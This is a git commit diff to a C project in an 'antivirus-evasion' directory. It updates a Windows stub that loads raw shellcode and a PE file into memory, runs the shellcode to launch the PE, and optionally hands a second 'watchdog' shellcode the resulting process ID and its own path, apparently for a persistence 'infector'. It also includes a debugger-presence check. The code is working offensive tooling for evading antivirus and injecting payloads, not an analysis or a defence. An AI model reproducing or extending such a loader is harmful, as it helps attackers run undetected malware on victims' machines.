9e21d2009a45ad6b54907ea1d5cd389cea90be6f
leo-lb <lle-bout@zaclys.net>
2019-02-27 02:36:16 -0800

    x86-stub-example: update for use with x86-watchdog-infector.

--- antivirus-evasion/x86-stub-example/main.c
+++ antivirus-evasion/x86-stub-example/main.c
@@ -12,23 +12,25 @@ static BYTE dummy[0x100000];
 void
 print_usage(const wchar_t* app_name)
 {
-  printf("Usage: %ws shellcode pe_file\n", app_name);
+  printf("Usage: %ws shellcode pe_file [ watchdog_shellcode ]\n", app_name);
 }
 
 int
 wmain(int argc, wchar_t* argv[], wchar_t* envp[])
 {
+  int ret = 0;
+
+  MessageBoxA(NULL,
+              "Attach a debugger or click OK to continue.",
+              "Information",
+              MB_OK | MB_ICONINFORMATION);
+
   if (argc < 3) {
     print_usage(argv[0]);
     return -1;
   }
 
   printf("dummy: %p\n", dummy);
-
-  MessageBoxA(NULL,
-              "Attach a debugger or click OK to continue.",
-              "Information",
-              MB_OK | MB_ICONINFORMATION);
 
   PVOID p_shellcode;
   DWORD size;
@@ -41,7 +43,19 @@ wmain(int argc, wchar_t* argv[], wchar_t* envp[])
   PVOID p_pe;
   if (read_file_to_mem(argv[2], &p_pe, &size, PAGE_READWRITE) < 0) {
     printf("Could not read file to memory: %ws\n", argv[2]);
-    return -3;
+    ret = -3;
+    goto free_shellcode;
+  }
+
+  PVOID p_watchdog = NULL;
+  DWORD watchdog_size;
+  if (argc > 3) {
+    if (read_file_to_mem(
+          argv[3], &p_watchdog, &watchdog_size, PAGE_EXECUTE_READWRITE) < 0) {
+      printf("Could not read file to memory: %ws\n", argv[3]);
+      ret = -4;
+      goto free_pe;
+    }
   }
 
   if (IsDebuggerPresent()) {
@@ -54,13 +68,34 @@ wmain(int argc, wchar_t* argv[], wchar_t* envp[])
   int s = entry(p_pe, &proc_id);
   if (s < 0) {
     printf("Shellcode's entrypoint returned a negative value: %d\n", s);
-    return -4;
+    ret = -5;
+    goto free_watchdog;
   }
 
   printf("Success. proc_id: %ld\n", proc_id);
 
-  VirtualFree(p_shellcode, 0, MEM_RELEASE);
-  VirtualFree(p_pe, 0, MEM_RELEASE);
+  if (p_watchdog) {
+    watchdog_entry* entry_watchdog = (watchdog_entry*)p_watchdog;
+    struct shell_param param = {
+      ._meta.kind = Shell,
+      .shell_base = p_watchdog,
+      .shell_size = watchdog_size,
+      .proc_id = proc_id,
+    };
 
-  return 0;
+    if (!GetModuleFileNameW(NULL, param.path, MAX_PATH)) {
+      ret = -6;
+      goto free_watchdog;
+    }
+
+    entry_watchdog((struct meta_param*)&param);
+  }
+
+free_watchdog:
+  VirtualFree(p_watchdog, 0, MEM_RELEASE);
+free_pe:
+  VirtualFree(p_pe, 0, MEM_RELEASE);
+free_shellcode:
+  VirtualFree(p_shellcode, 0, MEM_RELEASE);
+  return ret;
 }
--- antivirus-evasion/x86-stub-example/x86-stub-example.h
+++ antivirus-evasion/x86-stub-example/x86-stub-example.h
@@ -3,6 +3,28 @@
 /* main.c */
 typedef int __stdcall shellcode_entry(PBYTE pe_image, DWORD* proc_id);
 
+enum meta_param_kind
+{
+  Shell = 0,
+  Watchdog = 1,
+};
+
+struct meta_param
+{
+  int kind;
+};
+
+struct shell_param
+{
+  struct meta_param _meta;
+  PVOID shell_base;
+  SIZE_T shell_size;
+  ULONGLONG proc_id;
+  WCHAR path[MAX_PATH + 1];
+};
+
+typedef int __stdcall watchdog_entry(struct meta_param *param);
+
 /* file.c */
 int
 read_file_to_mem(const wchar_t* filename, PVOID* out, DWORD* size, DWORD prot);
